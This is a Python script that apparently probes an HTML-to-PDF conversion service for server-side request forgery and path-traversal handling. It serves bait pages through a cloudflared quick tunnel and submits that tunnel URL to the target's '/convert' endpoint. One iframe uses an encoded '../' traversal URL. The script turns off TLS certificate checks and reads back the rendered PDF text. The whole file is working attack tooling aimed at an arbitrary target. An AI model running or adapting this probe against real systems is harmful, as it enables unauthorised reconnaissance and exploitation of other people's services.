import http.server,threading,subprocess,re,time,os,ssl,urllib.request,urllib.parse,urllib.error
TARGET=os.environ['TARGET'].rstrip('/'); PORT=8765; ORIGIN=''
class H(http.server.BaseHTTPRequestHandler):
  def log_message(self,fmt,*args): print('HTTPLOG',fmt%args,flush=True)
  def sendb(self,b,ct='text/html; charset=utf-8'):
    self.send_response(200); self.send_header('Content-Type',ct); self.send_header('Content-Length',str(len(b))); self.send_header('Cache-Control','no-store'); self.end_headers(); self.wfile.write(b)
  def do_GET(self):
    p=urllib.parse.urlsplit(self.path).path; print('GETPATH',repr(self.path),flush=True)
    if p=='/probe':
      normal=ORIGIN+'/inner-normal.html'
      trav=ORIGIN+'/%2e%2e/%2e%2e/inner-trav.html'
      b=(f'<!doctype html><h1>OUTER</h1><p>NORMAL</p><iframe width=600 height=120 src="{normal}"></iframe><p>TRAV</p><iframe width=600 height=120 src="{trav}"></iframe>').encode()
      return self.sendb(b)
    if 'inner-normal' in self.path: return self.sendb(b'<!doctype html><h2>INNER_NORMAL_7XQ</h2>')
    if 'inner-trav' in self.path: return self.sendb(b'<!doctype html><h2>INNER_TRAV_9ZP</h2>')
    return self.sendb(b'<!doctype html><h2>FALLBACK_'+self.path.encode(errors='replace')+b'</h2>')
ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
opener=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
def get(u,t=20):
  with opener.open(urllib.request.Request(u,headers={'User-Agent':'DFO-PROBE'}),timeout=t) as r:return r.status,dict(r.headers),r.read()
srv=http.server.ThreadingHTTPServer(('127.0.0.1',PORT),H);threading.Thread(target=srv.serve_forever,daemon=True).start()
cf=subprocess.Popen(['/tmp/cloudflared','tunnel','--url',f'http://127.0.0.1:{PORT}','--no-autoupdate','--protocol','http2'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
while True:
  line=cf.stdout.readline(); print('CF',line.rstrip(),flush=True)
  m=re.search(r'https://[a-z0-9-]+\.trycloudflare\.com',line,re.I)
  if m: ORIGIN=m.group(); break
for i in range(20):
  try:
    st,h,b=get(ORIGIN+'/inner-normal.html',10); print('TUNNEL_READY',st,len(b),flush=True); break
  except Exception as e: print('RETRY',repr(e),flush=True); time.sleep(2)
data=urllib.parse.urlencode({'url':ORIGIN+'/probe?x='+str(time.time_ns())}).encode();req=urllib.request.Request(TARGET+'/convert',data=data,headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'DFO-PROBE'})
try:
  with opener.open(req,timeout=60) as r: body=r.read(); print('CONVERT',r.status,len(body),flush=True)
except urllib.error.HTTPError as e: body=e.read(); print('CONVERT_ERR',e.code,len(body),repr(body[:1000]),flush=True)
open('/tmp/probe.pdf','wb').write(body)
if body.startswith(b'%PDF'):
  try:
    txt=subprocess.check_output(['pdftotext','/tmp/probe.pdf','-'],stderr=subprocess.STDOUT,timeout=15); print('PDFTEXT',repr(txt[:4000]),flush=True)
  except Exception as e: print('PDFTEXT_ERR',repr(e),flush=True)
